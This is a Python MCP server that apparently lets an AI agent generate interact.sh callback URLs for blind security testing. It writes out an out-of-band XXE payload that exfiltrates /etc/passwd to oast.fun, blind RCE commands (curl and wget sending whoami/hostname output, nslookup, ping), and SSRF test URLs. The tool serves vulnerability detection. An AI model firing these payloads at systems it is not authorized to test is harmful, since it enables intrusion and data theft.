#!/usr/bin/env python3
"""
interactsh-mcp — OOB interaction / blind callback testing MCP server.

Generates unique interact.sh poll URLs for blind SSRF, XXE, RCE, and
SQLi detection. Tests can be correlated via unique callback identifiers.

Tools:
  - generate_callback    Create a new unique OOB callback URL
  - check_callbacks      Poll for any received callbacks
  - test_ssrf_blind      Generate SSRF callback + test URL payloads
  - test_xxe_oob         Generate OOB XXE DTD with callback exfil
  - test_rce_oob         Generate blind RCE pingback payloads
"""

import json
import os
import random
import string
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime
from typing import Any, Dict, List, Optional


INTERACTSH_SERVER = "https://oast.fun"
CALLBACKS: Dict[str, Dict[str, Any]] = {}


def _random_id(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def generate_callback(poll: bool = False, timeout: int = 30) -> Dict[str, Any]:
    unique_id = f"hh-{_random_id(12)}-{int(time.time())}"
    callback_url = f"{INTERACTSH_SERVER}/{unique_id}"
    poll_url = f"{INTERACTSH_SERVER}/poll?id={unique_id}"
    CALLBACKS[unique_id] = {
        "created": datetime.now().isoformat(),
        "callback_url": callback_url,
        "poll_url": poll_url,
        "unique_id": unique_id,
        "responses": [],
    }
    result = {
        "unique_id": unique_id,
        "callback_url": callback_url,
        "poll_url": poll_url,
    }
    if poll:
        time.sleep(2)
        result["responses"] = check_callbacks(unique_id)
    return result


def check_callbacks(unique_id: str = "") -> List[Dict[str, Any]]:
    if unique_id:
        ids_to_check = [unique_id]
    else:
        ids_to_check = list(CALLBACKS.keys())
    responses = []
    for uid in ids_to_check:
        poll_url = f"{INTERACTSH_SERVER}/poll?id={uid}"
        try:
            req = urllib.request.Request(poll_url, headers={"User-Agent": "Hercules-Hunt/2.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="replace")
                if body and body != "[]":
                    try:
                        parsed = json.loads(body)
                        if isinstance(parsed, list):
                            responses.extend(parsed)
                        else:
                            responses.append({"id": uid, "data": parsed})
                    except json.JSONDecodeError:
                        responses.append({"id": uid, "raw": body[:500]})
        except Exception:
            pass
    return responses


def test_ssrf_blind(ssrf_endpoint: str, param_name: str = "url") -> List[Dict[str, Any]]:
    cb = generate_callback()
    payloads = [
        f"http://{cb['unique_id']}.oast.fun/ssrf",
        f"https://{cb['unique_id']}.oast.fun/ssrf",
        f"http://{cb['unique_id']}.oast.fun/ssrf?test=1",
    ]
    return [{
        "callback": cb,
        "ssrf_payloads": payloads,
        "testing_url": f"{ssrf_endpoint}&{param_name}=http://{cb['unique_id']}.oast.fun/",
    }]


def test_xxe_oob(xml_endpoint: str) -> List[Dict[str, Any]]:
    cb = generate_callback()
    dtd = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{cb['unique_id']}.oast.fun/?data=%file;'>">
%eval;
%exfil;"""
    xml_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{cb['unique_id']}.oast.fun/exfil.dtd">
  %xxe;
]>
<root>test</root>"""
    return [{
        "callback": cb,
        "dtd_content": dtd,
        "xml_payload": xml_payload,
        "endpoint": xml_endpoint,
    }]


def test_rce_oob(rce_endpoint: str, param_name: str = "cmd") -> List[Dict[str, Any]]:
    cb = generate_callback()
    payloads = [
        f"curl http://{cb['unique_id']}.oast.fun/$(whoami)",
        f"nslookup {cb['unique_id']}.oast.fun",
        f"ping -c 1 {cb['unique_id']}.oast.fun",
        f"wget http://{cb['unique_id']}.oast.fun/$(hostname)",
    ]
    return [{
        "callback": cb,
        "rce_payloads": payloads,
    }]


TOOLS = [
    {"name": "generate_callback", "description": "Generate a unique OOB callback URL for blind testing", "inputSchema": {"type": "object", "properties": {"poll": {"type": "boolean", "description": "Poll immediately after generation", "default": False}}, "required": []}},
    {"name": "check_callbacks", "description": "Poll all or a specific callback for received interactions", "inputSchema": {"type": "object", "properties": {"unique_id": {"type": "string", "description": "Specific callback ID to check"}}, "required": []}},
    {"name": "test_ssrf_blind", "description": "Generate SSRF callback payloads", "inputSchema": {"type": "object", "properties": {"ssrf_endpoint": {"type": "string"}, "param_name": {"type": "string", "default": "url"}}, "required": ["ssrf_endpoint"]}},
    {"name": "test_xxe_oob", "description": "Generate OOB XXE payload with callback", "inputSchema": {"type": "object", "properties": {"xml_endpoint": {"type": "string"}}, "required": ["xml_endpoint"]}},
    {"name": "test_rce_oob", "description": "Generate blind RCE pingback payloads", "inputSchema": {"type": "object", "properties": {"rce_endpoint": {"type": "string"}, "param_name": {"type": "string", "default": "cmd"}}, "required": ["rce_endpoint"]}},
]

TOOL_EXEC = {
    "generate_callback": lambda a: generate_callback(poll=a.get("poll", False)),
    "check_callbacks": lambda a: check_callbacks(unique_id=a.get("unique_id", "")),
    "test_ssrf_blind": lambda a: test_ssrf_blind(a["ssrf_endpoint"], a.get("param_name", "url")),
    "test_xxe_oob": lambda a: test_xxe_oob(a["xml_endpoint"]),
    "test_rce_oob": lambda a: test_rce_oob(a["rce_endpoint"], a.get("param_name", "cmd")),
}


def handle(request: Dict[str, Any]) -> str:
    rid = request.get("id")
    method = request.get("method", "")
    params = request.get("params", {})
    if method == "initialize":
        return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"protocolVersion": "2025-03-26", "capabilities": {"tools": {}}, "serverInfo": {"name": "interactsh-mcp", "version": "2.0.0"}}})
    elif method == "tools/list":
        return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"tools": TOOLS}})
    elif method == "tools/call":
        name = params.get("name", "")
        args = params.get("arguments", {})
        if name not in TOOL_EXEC:
            return json.dumps({"jsonrpc": "2.0", "id": rid, "error": {"code": -32601, "message": f"Unknown: {name}"}})
        try:
            result = TOOL_EXEC[name](args)
            return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"content": [{"type": "text", "text": json.dumps(result, indent=2, default=str)}]}})
        except Exception as e:
            return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {"content": [{"type": "text", "text": json.dumps({"error": str(e)})}]}})
    elif method == "notifications/initialized":
        return json.dumps({"jsonrpc": "2.0", "id": rid, "result": {}})
    return json.dumps({"jsonrpc": "2.0", "id": rid, "error": {"code": -32601, "message": f"Unknown method: {method}"}})


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--list-tools":
        print(json.dumps({"tools": TOOLS}, indent=2))
        sys.exit(0)
    for line in sys.stdin:
        line = line.strip()
        if line:
            try:
                sys.stdout.write(handle(json.loads(line)) + "\n")
                sys.stdout.flush()
            except json.JSONDecodeError:
                pass
